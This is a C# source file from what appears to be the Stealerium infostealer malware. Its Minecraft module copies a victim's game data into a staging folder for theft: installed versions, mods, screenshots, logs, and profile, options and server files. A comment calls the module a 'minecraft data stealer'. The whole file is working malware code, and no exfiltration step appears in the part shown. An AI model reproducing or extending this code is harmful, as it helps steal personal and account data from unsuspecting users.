using System;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Gaming
{
    internal sealed class Minecraft
    {
        private static readonly string MinecraftPath = Path.Combine(Paths.Appdata, ".minecraft");

        // Get installed versions
        private static void SaveVersions(string sSavePath)
        {
            try
            {
                foreach (var version in Directory.GetDirectories(Path.Combine(MinecraftPath, "versions")))
                {
                    var name = new DirectoryInfo(version).Name;
                    var size = Filemanager.DirectorySize(version) + " bytes";
                    var date = Directory.GetCreationTime(version)
                        .ToString("yyyy-MM-dd h:mm:ss tt");

                    File.AppendAllText(sSavePath + "\\versions.txt",
                        $"VERSION: {name}\n\tSIZE: {size}\n\tDATE: {date}\n\n");
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Minecraft >> Failed collect installed versions\n" + ex);
            }
        }

        // Get installed mods
        private static void SaveMods(string sSavePath)
        {
            try
            {
                foreach (var mod in Directory.GetFiles(Path.Combine(MinecraftPath, "mods")))
                {
                    var name = Path.GetFileName(mod);
                    var size = new FileInfo(mod).Length + " bytes";
                    var date = File.GetCreationTime(mod)
                        .ToString("yyyy-MM-dd h:mm:ss tt");

                    File.AppendAllText(sSavePath + "\\mods.txt", $"MOD: {name}\n\tSIZE: {size}\n\tDATE: {date}\n\n");
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Minecraft >> Failed collect installed mods\n" + ex);
            }
        }

        // Get screenshots
        private static void SaveScreenshots(string sSavePath)
        {
            try
            {
                var screenshots = Directory.GetFiles(Path.Combine(MinecraftPath, "screenshots"));
                if (screenshots.Length == 0) return;

                Directory.CreateDirectory(sSavePath + "\\screenshots");
                foreach (var screenshot in screenshots)
                    File.Copy(screenshot, sSavePath + "\\screenshots\\" + Path.GetFileName(screenshot));
            }
            catch (Exception ex)
            {
                Logging.Log("Minecraft >> Failed collect screenshots\n" + ex);
            }
        }

        // Get profile & options & servers files 
        private static void SaveFiles(string sSavePath)
        {
            try
            {
                var files = Directory.GetFiles(MinecraftPath);
                foreach (var file in files)
                {
                    var fileInfo = new FileInfo(file);
                    var sFile = fileInfo.Name.ToLower();
                    if (sFile.Contains("profile") || sFile.Contains("options") || sFile.Contains("servers"))
                        fileInfo.CopyTo(Path.Combine(sSavePath, fileInfo.Name));
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Minecraft >> Failed collect profiles\n" + ex);
            }
        }

        // Get logs
        private static void SaveLogs(string sSavePath)
        {
            try
            {
                var logdir = Path.Combine(MinecraftPath, "logs");
                var savedir = Path.Combine(sSavePath, "logs");
                if (!Directory.Exists(logdir)) return;
                Directory.CreateDirectory(savedir);
                var files = Directory.GetFiles(logdir);
                foreach (var file in files)
                {
                    var fileInfo = new FileInfo(file);
                    if (fileInfo.Length >= Config.GrabberSizeLimit) continue;
                    var to = Path.Combine(savedir, fileInfo.Name);
                    if (!File.Exists(to))
                        fileInfo.CopyTo(to);
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Minecraft >> Failed collect logs\n" + ex);
            }
        }

        // Run minecraft data stealer
        public static void SaveAll(string sSavePath)
        {
            if (!Directory.Exists(MinecraftPath)) return;

            try
            {
                Directory.CreateDirectory(sSavePath);
                SaveMods(sSavePath);
                SaveFiles(sSavePath);
                SaveVersions(sSavePath);
                if (Config.GrabberModule != "1") return;
                SaveLogs(sSavePath);
                SaveScreenshots(sSavePath);
            }
            catch (Exception ex)
            {
                Logging.Log("Minecraft >> Failed collect data\n" + ex);
            }
        }
    }
}